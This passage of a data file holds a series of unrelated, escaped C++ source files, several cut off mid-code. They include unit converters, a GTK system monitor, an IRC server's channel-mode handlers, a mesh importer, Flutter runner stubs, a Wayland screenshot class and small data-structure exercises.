\" \\370ra.\" << endl;\r\n\treturn rankine;\r\n}\r\ndouble kelvintoreaumur(double kelvin)\r\n{\r\n\tcout << \"enter value in kelvin: \";\r\n\tdouble reaumur;\r\n\tcin >> kelvin;\r\n\twhile (!cin || cin.fail())\r\n\t{\r\n\t\tcin.clear();\r\n\t\tstring junk;\r\n\t\tgetline(cin, junk);\r\n\t\tcout << \"enter value in kelvin: \";\r\n\t\tcin >> kelvin;\r\n\t}\r\n\treaumur = (kelvin - 273.15) * 0.8;\r\n\tcout << reaumur << \" \\370re.\" << endl;\r\n\treturn reaumur;\r\n}\r\n//temperature option 4\r\ndouble rankinetocelsius(double rankine)\r\n{\r\n\tcout << \"enter value in rankine: \";\r\n\tdouble celsius;\r\n\tcin >> rankine;\r\n\twhile (!cin || cin.fail())\r\n\t{\r\n\t\tcin.clear();\r\n\t\tstring junk;\r\n\t\tgetline(cin, junk);\r\n\t\tcout << \"enter value in rankine: \";\r\n\t\tcin >> rankine;\r\n\t}\r\n\tcelsius = (rankine - 491.67) * 5 / 9;\r\n\tcout << celsius << \" \\370c.\" << endl;\r\n\treturn celsius;\r\n}\r\ndouble rankinetofahrenheit(double rankine)\r\n{\r\n\tcout << \"enter value in rankine: \"",
    "#include \"common.hpp\"\n\nvoid monoColorPrint(ColorPair colorPair, int y, int startingX, string text)\n{\n    int color = static_cast<int>(colorPair);\n    attron(COLOR_PAIR(color));\n    mvprintw(y, startingX, text.c_str());\n    attroff(COLOR_PAIR(color));\n}\n\nvoid multiColorPrint(int y, int startingX, string text, int colorCount, ColorRange* colorRanges)\n{\n    int charIndex = 0;\n    for (int colorRangeIndex = 0; colorRangeIndex < colorCount; colorRangeIndex++)\n    {\n        int color = static_cast<int>(colorRanges[colorRangeIndex].color);\n        attron(COLOR_PAIR(color));\n\n        // Print text of the current color range\n        for (; charIndex < colorRanges[colorRangeIndex].end; charIndex++)\n        {\n            mvaddch(y, startingX++, text[charIndex]);\n        }\n        \n        attroff(COLOR_PAIR(color));\n    }\n}\n\nstring formatString(string format, size_t argc, string argv[])\n{\n    // For every \"%\" in the format string, replace it with the next argument (if available)\n    std::ostringstream ss;\n    size_t argIndex = 0;\n    for (size_t i = 0; i < format.size(); i++)\n    {\n        if (format[i] == '~' && argIndex < argc)\n        {\n            ss << argv[argIndex];\n            argIndex++;\n        }\n        else\n        {\n            ss << format[i];\n        }\n    }\n\n    return ss.str();\n}\n\nbool isRed(Suit suit)\n{\n    return suit == Suit::DIAMONDS || suit == Suit::HEARTS;\n}",
    "#include \"Utils.hpp\"\n#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <algorithm>\n#include <Eigen/Eigen>\n#include <cmath>\n\nnamespace PolygonalLibrary {\n\nbool ImportCell0Ds(const string &filename, PolygonalMesh& mesh)\n{\n    ifstream file;\n    file.open(filename);\n\n    if (file.fail())\n        return false;\n\n    list<string> listLines;\n    string line;\n    while (getline(file, line))\n    {\n        replace(line.begin(), line.end(), ';', ' ');\n        listLines.push_back(line);\n    }\n\n    listLines.pop_front();\n\n    mesh.NumberCell0D = listLines.size();\n    if (mesh.NumberCell0D == 0)\n    {\n        cerr << \"Non ci sono celle 0D\" << endl;\n        return false;\n    }\n\n    mesh.Cell0DId.reserve(mesh.NumberCell0D);\n    mesh.Cell0DCoordinates.reserve(mesh.NumberCell0D);\n\n    for (const string& line : listLines)\n    {\n        istringstream converter(line);\n        unsigned int id;\n        unsigned int marker;\n        Vector2d coord;\n\n        converter >> id >> marker >> coord(0) >> coord(1);\n\n        mesh.Cell0DId.push_back(id);\n        mesh.Cell0DCoordinates.push_back(coord);\n\n        if (marker != 0)\n        {\n            auto ret = mesh.Cell0DMarkers.insert({marker, {id}});\n            if (!ret.second)\n                (ret.first)->second.push_back(id);\n        }\n    }\n\n    file.close();\n    return true;\n}\n\n\n\nbool ImportCell1Ds(const string &filename, PolygonalMesh& mesh)\n{\n    ifstream file;\n    file.open(filename);\n\n    if (file.fail())\n        return false;\n\n    list<string> listLines;\n    string line;\n    while (getline(file, line))\n    {\n        replace(line.begin(), line.end(), ';', ' ');\n        listLines.push_back(line);\n    }\n\n    listLines.pop_front();\n\n    mesh.NumberCell1D = listLines.size();\n\n    if (mesh.NumberCell1D == 0)\n    {\n        cerr << \"Non ci sono celle 1D\" << endl;\n        return false;\n    }\n\n    mesh.Cell1DId.reserve(mesh.NumberCell1D);\n    mesh.Cell1DVertices.reserve(mesh.NumberCell1D);\n\n    for (const string& line : listLines)\n    {\n        istringstream converter(line);\n\n        unsigned int id;\n        unsigned int marker;\n        Vector2i vertices;\n\n        converter >> id >> marker >> vertices(0) >> vertices(1);\n\n        mesh.Cell1DId.push_back(id);\n        mesh.Cell1DVertices.push_back(vertices);\n\n        if (marker != 0)\n        {\n            auto ret = mesh.Cell1DMarkers.insert({marker, {id}});\n            if (!ret.second)\n                (ret.first)->second.push_back(id);\n        }\n    }\n\n    file.close();\n    return true;\n}\n\n\n\nbool ImportCell2Ds(const string &filename, PolygonalMesh& mesh)\n{\n    ifstream file;\n    file.open(filename);\n\n    if(file.fail())\n        return false;\n\n    list<string> listLines;\n    string line;\n    while (getline(file, line))\n    {\n        replace(line.begin(), line.end(), ';', ' ');\n        listLines.push_back(line);\n    }\n\n    listLines.pop_front();\n\n    mesh.NumberCell2D = listLines.size();\n\n    if (mesh.NumberCell2D == 0)\n    {\n        cerr << \"Non ci sono celle 2D\" << endl;\n        return false;\n    }\n\n    mesh.Cell2DId.reserve(mesh.NumberCell2D);\n    mesh.Cell2DVertices.reserve(mesh.NumberCell2D);\n    mesh.Cell2DEdges.reserve(mesh.NumberCell2D);\n\n    for (const string& line : listLines)\n    {\n        istringstream converter(line);\n\n        unsigned int id;\n        unsigned int marker;\n        converter >> id;\n        converter >> marker;\n\n        unsigned int NumVertices;\n        converter >> NumVertices;\n\n        vector<unsigned int> vertices(NumVertices);\n        for (unsigned int i = 0; i < NumVertices; i++)\n            converter >> vertices[i];\n\n        unsigned int NumEdges;\n        converter >> NumEdges;\n\n        vector<unsigned int> edges(NumEdges);\n        for (unsigned int i = 0; i < NumEdges; i++)\n            converter >> edges[i];\n\n        mesh.Cell2DId.push_back(id);\n        mesh.Cell2DVertices.push_back(vertices);\n        mesh.Cell2DEdges.push_back(edges);\n    }\n\n    file.close();\n    return true;\n}\n\n\nbool ImportMesh(const string &filepath, PolygonalMesh& mesh)\n{\n\n    if (!ImportCell0Ds(filepath + \"/Cell0Ds.csv\", mesh))\n    {\n        return false;\n    }\n    else\n    {\n        cout << \"Cell0D marker:\" << endl;\n        for (auto it = mesh.Cell0DMarkers.begin(); it != mesh.Cell0DMarkers.end(); it++)\n        {\n            cout << \"key:\\t\" << it->first << \"\\t values:\";\n            for (const unsigned int id : it->second)\n                cout << \"\\t\" << id;\n\n            cout << endl;\n        }\n    }\n\n\n    if (!ImportCell1Ds(filepath + \"/Cell1Ds.csv\", mesh))\n    {\n        return false;\n    }\n    else\n    {\n        cout << \"Cell1D marker:\" << endl;\n        for (auto it = mesh.Cell1DMarkers.begin(); it != mesh.Cell1DMarkers.end(); it++)\n        {\n            cout << \"key:\\t\" << it->first << \"\\t values:\";\n            for (const unsigned int id : it->second)\n                cout << \"\\t\" << id;\n\n            cout << endl;\n        }\n\n        // TEST LUNGHEZZA LATI\n        for (unsigned int c = 0; c < mesh.NumberCell1D; c++)\n   ",
    "#include <gtk/gtk.h>\n#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <string>\n#include <thread>\n#include <unistd.h>\n#include <map>\n#include <sys/statvfs.h>\n#include <stdexcept>\n\nusing namespace std;\n\nGtkWidget *cpu_label, *ram_label, *rx_label, *tx_label, *disk_label, *temp_label;\nGtkWidget *cpu_progress, *ram_progress;\nGtkWidget *cpu_icon, *ram_icon, *network_icon, *disk_icon, *temp_icon;\nGtkWidget *cpu_graph, *ram_graph; \n\nvoid readCPUUsage(unsigned long long &total_jiffies, unsigned long long &work_jiffies) {\n    ifstream file(\"/proc/stat\");\n    if (!file.is_open()) {\n        throw runtime_error(\"Failed to open /proc/stat\");\n    }\n\n    string line;\n    if (!getline(file, line)) {\n        file.close();\n        throw runtime_error(\"Failed to read from /proc/stat\");\n    }\n\n    file.close();\n\n    istringstream iss(line);\n    string cpu;\n    unsigned long long user, nice, system, idle, iowait, irq, softirq, steal;\n\n    if (!(iss >> cpu >> user >> nice >> system >> idle >> iowait >> irq >> softirq >> steal)) {\n        throw runtime_error(\"Failed to parse /proc/stat\");\n    }\n\n    total_jiffies = user + nice + system + idle + iowait + irq + softirq + steal;\n    work_jiffies = user + nice + system + irq + softirq + steal;\n}\n\ndouble calculateCPUUsage() {\n    try {\n        unsigned long long total_jiffies1, work_jiffies1;\n        unsigned long long total_jiffies2, work_jiffies2;\n\n        readCPUUsage(total_jiffies1, work_jiffies1);\n        sleep(1);\n        readCPUUsage(total_jiffies2, work_jiffies2);\n\n        unsigned long long total_diff = total_jiffies2 - total_jiffies1;\n        unsigned long long work_diff = work_jiffies2 - work_jiffies1;\n\n        return (double)work_diff / total_diff * 100.0;\n    } catch (const exception &e) {\n        cerr << \"Error calculating CPU usage: \" << e.what() << endl;\n        return 0.0;\n    }\n}\n\ndouble readRAMUsage() {\n    ifstream file(\"/proc/meminfo\");\n    if (!file.is_open()) {\n        throw runtime_error(\"Failed to open /proc/meminfo\");\n    }\n\n    string line;\n    unsigned long mem_total = 0, mem_free = 0, buffers = 0, cached = 0;\n\n    while (getline(file, line)) {\n        if (line.find(\"MemTotal\") != string::npos)\n            sscanf(line.c_str(), \"MemTotal: %lu\", &mem_total);\n        else if (line.find(\"MemFree\") != string::npos)\n            sscanf(line.c_str(), \"MemFree: %lu\", &mem_free);\n        else if (line.find(\"Buffers\") != string::npos)\n            sscanf(line.c_str(), \"Buffers: %lu\", &buffers);\n        else if (line.find(\"Cached\") != string::npos)\n            sscanf(line.c_str(), \"Cached: %lu\", &cached);\n    }\n\n    file.close();\n\n    if (mem_total == 0) {\n        throw runtime_error(\"Invalid memory information\");\n    }\n\n    double mem_used = mem_total - mem_free - buffers - cached;\n    return (mem_used / mem_total) * 100.0;\n}\n\nvoid readNetworkActivity(double &rx_bytes, double &tx_bytes) {\n    ifstream file(\"/proc/net/dev\");\n    if (!file.is_open()) {\n        throw runtime_error(\"Failed to open /proc/net/dev\");\n    }\n\n    string line;\n    getline(file, line);\n    getline(file, line);\n\n    rx_bytes = tx_bytes = 0.0;\n\n    while (getline(file, line)) {\n        istringstream iss(line);\n        string interface;\n        double receive, transmit;\n\n        iss >> interface;\n        iss >> receive;\n        for (int i = 0; i < 7; i++) {\n            iss >> transmit;\n        }\n        iss >> transmit;\n        rx_bytes += receive;\n        tx_bytes += transmit;\n    }\n\n    file.close();\n}\n\nvoid readDiskActivity(map<string, unsigned long long> &read_bytes,\n                      map<string, unsigned long long> &write_bytes) {\n    ifstream file(\"/proc/diskstats\");\n    if (!file.is_open()) {\n        throw runtime_error(\"Failed to open /proc/diskstats\");\n    }\n\n    string line;\n    read_bytes.clear();\n    write_bytes.clear();\n\n    while (getline(file, line)) {\n        istringstream iss(line);\n        string device;\n        unsigned long long reads, read_sectors, writes, write_sectors;\n\n        iss >> device >> device >> device; // skip first three columns\n        if (!(iss >> reads >> reads >> read_sectors >> reads >> writes >> writes >> write_sectors >> writes)) {\n            continue; // skip lines that cannot be parsed\n        }\n\n        if (device.substr(0, 3) == \"ram\" || device.substr(0, 3) == \"loop\") {\n            continue; // Skip RAM and loopback devices\n        }\n\n        read_bytes[device] = read_sectors * 512; // sector size is 512 bytes\n        write_bytes[device] = write_sectors * 512;\n    }\n\n    file.close();\n}\n\npair<double, double> calculateDiskSpeed() {\n    try {\n        map<string, unsigned long long> read_bytes1, write_bytes1;\n        map<string, unsigned long long> read_bytes2, write_bytes2;\n\n        readDiskActivity(read_bytes1, write_bytes1);\n        sleep(1);\n        readDiskActivity(read_bytes2, write_bytes2);\n\n        unsigned long long total_read_diff = 0;\n        unsigned long long total_write_diff = 0;\n\n        for (const auto &entry : read_byt",
    "//\n// Created by ldiogo on 03-05-2024.\n//\n\n#include \"../inc/client.hpp\"\n\nuser::user(int newSocket)\n{\n\tisOp = false;\n    clientSize = sizeof(client);\n    clientSocket = newSocket;\n    if (clientSocket == -1 )\n    {\n        std::cerr << \"Can't accept client!\";\n        exit(EXIT_FAILURE);\n    }\n    status = 0;\n\tfrom_nc = 0;\n    std::cout << \"New client connected\" << std::endl;\n}\n\nuser::~user()\n{\n}\n\nint\tuser::modeInvite(server *server, std::string channel, std::string flag)\n{\n\tif (flag.compare(\"+i\") == 0 && server->channels[channel]->getInviteMode() == false)\n\t\tserver->channels[channel]->setInviteMode(true);\n\telse if (flag.compare(\"-i\") == 0 && server->channels[channel]->getInviteMode() == true)\n\t\tserver->channels[channel]->setInviteMode(false);\n\telse\n\t\treturn (1);\n\tstd::string message = \":\" + this->nickname + \"!\" + this->username + \" MODE \" + channel + \" \" + flag + \"\\r\\n\";\n\tsend_all(server, message.c_str(), message.size(), 0, channel);\n\treturn (0);\n}\n\nint\tuser::modeTopic(server *server, std::string channel, std::string flag)\n{\n\tif (flag.compare(\"+t\") == 0 && server->channels[channel]->getTopicMode() == false)\n\t\tserver->channels[channel]->setTopicMode(true);\n\telse if (flag.compare(\"-t\") == 0 && server->channels[channel]->getTopicMode() == true)\n\t\tserver->channels[channel]->setTopicMode(false);\n\telse\n\t\treturn (1);\n\tstd::string message = \":\" + this->nickname + \"!\" + this->username + \" MODE \" + channel + \" \" + flag + \"\\r\\n\";\n\tsend_all(server, message.c_str(), message.size(), 0, channel);\n\treturn (0); \n};\n\nvoid\tuser::modeOperator(server *server, user &newOp, std::string channel, std::string flag)\n{\n\tif (flag.compare(\"+o\") == 0 && newOp.getOpStatus() == false)\n\t\tnewOp.setOpStatus(true);\n\telse if (flag.compare(\"-o\") == 0 && newOp.getOpStatus() == true)\n\t\tnewOp.setOpStatus(false);\n\telse\n\t\treturn ;\n\tstd::string message = \":\" + this->nickname + \"!\" + this->username + \" MODE \" + channel + \" \" + flag + \" \" + newOp.getUsername() + \"\\r\\n\";\n\tsend_all(server, message.c_str(), message.size(), 0, channel);\n}\n\nint\tuser::modePassword(server *server, std::string channel, std::string flag, std::string key)\n{\n\tstd::string message;\n\tif (key.empty())\n\t\treturn (1);\n\tif (flag.compare(\"+k\") == 0 && server->channels[channel]->getPassword().empty())\n\t{\n\t\tserver->channels[channel]->setPassword(key);\n\t\tmessage = \":\" + this->nickname + \"!\" + this->username + \" MODE \" + channel + \" \" + flag + \" \" + key + \"\\r\\n\";\n\t}\n\telse if (flag.compare(\"-k\") == 0  && key.compare(server->channels[channel]->getPassword()) == 0)\n\t{\n\t\tserver->channels[channel]->setPassword(\"\");\n\t\tmessage = \":\" + this->nickname + \"!\" + this->username + \" MODE \" + channel + \" \" + flag + \" \" + key + \"\\r\\n\";\n\t}\n\telse if (flag.compare(\"+k\") == 0 || (flag.compare(\"-k\") == 0 && key.compare(server->channels[channel]->getPassword()) != 0))\n\t{\n\t\tmessage = \":\" + channel + \" :Channel key already set\\r\\n\";\n\t\tsend_user(clientSocket, message.c_str(), message.size(), 0);\n\t\treturn (1);\n\t}\n\tsend_all(server, message.c_str(), message.size(), 0, channel);\n\treturn (0);\n}\n\nint\tuser::modeLimit(server *server, std::string channel, std::string flag, std::string amount)\n{\n\tstd::string message;\n\tif (flag.compare(\"+l\") == 0 && server->channels[channel]->getMaxUsers() >= 0)\n\t{\n\t\tint\tn = atoi(amount.c_str());\n\t\tif (n <= 0 || n == server->channels[channel]->getMaxUsers())\n\t\t\treturn (1);\n\t\tserver->channels[channel]->setmaxUsers(n);\n\t\tsize_t nSize = amount.find_first_not_of(\"0123456789\");\n\t\tmessage = \":\" + this->nickname + \"!\" + this->username + \" MODE \" + channel + \" \" + flag + \" \" + amount.substr(0, nSize) + \"\\r\\n\";\n\t}\n\telse if (flag.compare(\"-l\") == 0 && server->channels[channel]->getMaxUsers() > 0)\n\t{\n\t\tserver->channels[channel]->setmaxUsers(0);\n\t\tmessage = \":\" + this->nickname + \"!\" + this->username + \" MODE \" + channel + \" \" + flag + \"\\r\\n\";\n\t}\n\telse\n\t\treturn (1);\n\tsend_all(server, message.c_str(), message.size(), 0, channel);\n\treturn (0);\n}\n\nint\tuser::modeCheck(server *server, std::string channel, int fd)\n{\n\tif (server->channels.find(channel) == server->channels.end())\n\t\treturn (1);\n\tif (server->channels[channel]->users[fd].isOp == false)\n\t{\n\t\tstd::string message = \":\" + channel + \" 482 \" + this->nickname + \" \" + channel + \" :You're not channel operator\\r\\n\";\n\t\tsend_user(fd, message.c_str(), message.size(), 0);\n\t\treturn (1);\n\t}\n\treturn (0);\n}\n\nvoid\tuser::mode(server *server, char *buffer, int fd)\n{\n\tstd::string\tcommand, channel, flag, nameOp;\n\tstd::istringstream iss2(buffer);\n\tiss2 >> command >> channel >> flag >> nameOp;\n\t\n\tif (server->channels[channel]->users[fd].modeCheck(server, channel, fd))\n\t\treturn ;\n\tif (server->channels[channel]->users[fd].modeLimit(server, channel, flag, nameOp) &&\n\t\tserver->channels[channel]->users[fd].modeInvite(server, channel, flag) &&\n\tserver->channels[channel]->users[fd].modeTopic(server, channel, flag) &&\n\tserver->channels[channel]->users[fd].modePassword(server, channel, flag, nameOp))\n\t\treturn ;\n\tstd::size_t endPos = nameOp.find_first_of(\"\\t\\n\\r \");\n\tif (endPos != std::",
    "#include <iostream>\n#include <iomanip>\n#include <cstdint>\n\n#include \"header.hpp\"\n#include \"decoder.hpp\"\n#include \"internal.hpp\"\n\nvoid dump()\n{\n    std::cout << \"----------------------------------\\n\";\n    std::cout << \"DUMPING REGISTER CONTENTS:\\n\";\n    std::cout << \"----------------------------------\\n\";\n    std::cout << \"A : \" << \"0x\" << std::hex << (int) a << \"\\n\";\n    std::cout << \"B : \" << \"0x\" << std::hex << (int) b << \"\\n\";\n\n    for (int i = 0; i < 8; i++) {\n        std::cout << \"R\" << i << \": \" << \"0x\" << std::hex << (int) *(r[i]) << \"\\n\";\n    }\n\n    std::cout << \"DPTR: \" << \"0x\" << std::hex << (int) dptr << \"\\n\";\n\n    std::cout << \"----------------------------------\\n\\n\";\n}\n\nvoid dump_ram()\n{\n    std::cout << \"----------------------------------\\n\";\n    std::cout << \"DUMPING RAM CONTENTS:\\n\";\n    std::cout << \"----------------------------------\\n\";\n    for (int i = 0; i < 16; i++) {\n        for (int j = 0; j < 8; j++) {\n            std::cout << std::setfill('0') << std::setw(2) << std::hex << (int) ram[i*8+j] << \" \";\n        }\n        std::cout << \"\\n\";\n    }\n    std::cout << \"----------------------------------\\n\\n\";\n}\n\nint main()\n{\n    dump();\n    read_bin(\"main.bin\", false);\n    read_bin(\"data.bin\", true);\n    run();\n    dump();\n    dump_ram();\n    dump_pswr();\n\n    std::cout << \"Exited!\\n\";\n\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"email_send\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"screenshot.hpp\"\n\n// FIXME: this is not cross platform\n#include \"screenshot_image_provider.hpp\"\n#include \"zwlr_screencopy_frame.hpp\"\n#include \"zwlr_screencopy_manager.hpp\"\n\n#include <limits>\n#include <memory>\n\nvoid Screenshot::free(const QUrl &url) const {\n  auto *provider = ScreenshotImageProvider::instance(qmlEngine(this));\n  provider->free(url);\n}\n\nQImage Screenshot::grabWindowWaylandInternal(\n    const QScreen &screen, bool captureCursor,\n    const std::function<void(QtWaylandClient::QWaylandShmBuffer *)> &onReady,\n    const std::function<void()> &onFailure) const {\n  auto *wlScreen =\n      dynamic_cast<QtWaylandClient::QWaylandScreen *>(screen.handle());\n  auto *screencopyManager = ZwlrScreencopyManager::instance();\n  auto *frame = screencopyManager->captureOutput(captureCursor, wlScreen);\n  auto image = QImage();\n  // it's difficult to create a lambda here because it's difficult to properly\n  // manage its lifetime\n  QObject::connect(frame, &ZwlrScreencopyFrame::ready, this, onReady);\n  QObject::connect(frame, &ZwlrScreencopyFrame::failed, this, onFailure);\n  return image;\n}\n\nQUrl Screenshot::cache(const QPixmap &pixmap) const {\n  return ScreenshotImageProvider::instance(qmlEngine(this))->cache(pixmap);\n}\n\nvoid Screenshot::capture(const QQmlListReference &screens,\n                         const QJSValue &onSuccess, const QJSValue &onFailure,\n                         bool captureCursor) const {\n  auto *engine = qmlEngine(this);\n  if (screens.size() == 1) {\n    auto *screen =\n        dynamic_cast<QQuickScreenInfo *>(screens.at(0))->wrappedScreen();\n    if (!ZwlrScreencopyManager::instance()->isActive()) {\n      onSuccess.call(\n          {engine->toScriptValue(this->cache(screen->grabWindow()))});\n    } else {\n      const auto onSuccessCpp =\n          [&](QtWaylandClient::QWaylandShmBuffer *buffer) {\n            onSuccess.call({engine->toScriptValue(\n                this->cache(QPixmap::fromImage(*buffer->image())))});\n          };\n      const auto onFailureCpp = [&]() { onFailure.call(); };\n      grabWindowWaylandInternal(*screen, captureCursor, onSuccessCpp,\n                                onFailureCpp);\n    }\n  } else {\n    const auto minInt = std::numeric_limits<int>::min();\n    const auto maxInt = std::numeric_limits<int>::max();\n    auto bounds = QRect(QPoint(maxInt, maxInt), QPoint(minInt, minInt));\n    for (auto i = 0; i < screens.size(); i += 1) {\n      auto *screen =\n          dynamic_cast<QQuickScreenInfo *>(screens.at(i))->wrappedScreen();\n      const auto geometry = screen->geometry();\n      bounds.setLeft(std::min(bounds.left(), geometry.left()));\n      bounds.setRight(std::max(bounds.right(), geometry.right()));\n      bounds.setTop(std::min(bounds.top(), geometry.top()));\n      bounds.setBottom(std::max(bounds.bottom(), geometry.bottom()));\n    }\n    if (!ZwlrScreencopyManager::instance()->isActive()) {\n      auto pixmap = QPixmap(bounds.width(), bounds.height());\n      auto painter = QPainter(&pixmap);\n      for (auto i = 0; i < screens.size(); i += 1) {\n        auto *screen =\n            dynamic_cast<QQuickScreenInfo *>(screens.at(i))->wrappedScreen();\n        const auto screenBounds = screen->geometry();\n        painter.drawPixmap(screenBounds, screen->grabWindow());\n      }\n      onSuccess.call({engine->toScriptValue(this->cache(pixmap))});\n    } else {\n      auto pixmap = std::make_shared<QPixmap>(bounds.width(), bounds.height());\n      auto painter = std::make_shared<QPainter>(&*pixmap);\n      auto failed = std::make_shared<bool>(false);\n      auto screensLeft = std::make_shared<qsizetype>(screens.size());\n      for (auto i = 0; i < screens.size(); i += 1) {\n        auto *screen =\n            dynamic_cast<QQuickScreenInfo *>(screens.at(i))->wrappedScreen();\n        const auto onSuccessCpp =\n            [screen, painter, screensLeft, onSuccess, engine, pixmap,\n             this](QtWaylandClient::QWaylandShmBuffer *buffer) {\n              const auto screenBounds = screen->geometry();\n              painter->drawImage(screenBounds, *buffer->image());\n              delete buffer;\n              *screensLeft -= 1;\n              if (*screensLeft == 0) {\n                onSuccess.call({engine->toScriptValue(this->cache(*pixmap))});\n                painter->end();\n              }\n            };\n        const auto onFailureCpp = [=]() {\n          if (!*failed) {\n            onFailure.call();\n          }\n          *failed = true;\n        };\n        grabWindowWaylandInternal(*screen, captureCursor, onSuccessCpp,\n                                  onFailureCpp);\n      }\n    }\n  }\n}",
    "/*\n\u6709\u6b63\u786e\u6027\u4fdd\u8bc1\u7684map\u64cd\u4f5c\n*/\n\n#include<bits/stdc++.h>\n#define endl \"\\n\"\nusing namespace std;\nint main()\n{\n    ios::sync_with_stdio(false);\n    cin.tie(0);\n    cout.tie(0);\n    int n,m;\n    cin >> n >> m;\n    map<int,string>data;\n    for(int i=1;i<=n;++i){\n        int x;\n        cin >> x;\n        string s;\n        cin >> s;\n        data[x]=s;\n    }\n    for(int i=1;i<=m;++i){\n        int op;\n        cin >> op;\n        if(op==1){        //\u67e5\u8be2\n            int x;\n            cin >> x;\n            auto flag = data.find(x);\n            if(flag==data.end()){\n               // cout << \"Not Found\\n\";\n            }//else cout << flag->first << \" \" << flag->second << \"\\n\";\n        }else if(op==2){  //\u63d2\u5165,\u6210\u529f\u8fd4\u56deSuccess!\n            int x;\n            cin >> x;\n            string s;\n            cin >> s;\n            if(data.find(x)==data.end()){\n                data[x] = s;\n            }\n        }else if(op==3){  //\u5220\u9664,\u4e0d\u5b58\u5728\u8fd4\u56deNot existed! / \u6210\u529f\u8fd4\u56deSuccess!\n            int x;\n            cin >> x;\n            if(data.find(x)!=data.end()){\n                data.erase(x);\n                //cout << \"ERASE SUCCESS\\n\";\n            }//else cout << \"Not Found\\n\";\n        }\n    }\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"personnel_expenses\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint Data;\n\tnode* next;\n};\n\nnode* current = NULL;\nnode* Front = NULL;\nnode* Rear = NULL;\n\nvoid enqueue(int newdata)\n{\n\tnode* current = new node();\n\tcurrent->Data = newdata;\n\tif (Rear != NULL)\n\t{\n\t\tRear->next = current;\n\t\tRear = current;\n\t}\n\telse\n\t{\n\t\tFront = current;\n\t\tRear = current;\n\t}\n\tRear->next = NULL;\n}\nvoid dequeue()\n{\n\tif (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\tFront = Front->next;\n\t\tdelete current;\n\t}\n\telse { cout << \"No element Found to be dequeued\" << endl; }\n}\nvoid dequeueAll()\n{\n\twhile (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\tFront = Front->next;\n\t\tdelete current;\n\t}\n\tRear = Front = NULL;\n}\nvoid display()\n{\n\tif (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->Data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse { cout << \"There is no data in the queue\\n\"; }\n}\nvoid app()\n{\n\t/*\n\t\top -> operation\n\t\tc -> confirm\n\t\te -> enqueue node\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\tint op, c, e, ao, s;\n\tcout << \"--- Welcome to queue implementation---\\n\";\n\tdo\n\t{\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Enqueue -> (1)\\n\";\n\t\tcout << \"Dequeue an Elements -> (2) \\n\";\n\t\tcout << \"Dequeue All Elements -> (3)\\n\";\n\t\tcout << \"Display -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tswitch (op)\n\t\t{\n\t\tcase 1:\n\t\t\tcout << \"Enter value do you want to enqueue\\n\";\n\t\t\tcin >> e;\n\t\t\tenqueue(e);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tcout << \"Are you sure to dequeue one node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdequeue();\n\t\t\t\tcout << \"\\nCheck data of queue after dequeuing first node :\\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Dequeue is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tcout << \"Are you sure to dequeue all nodes\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 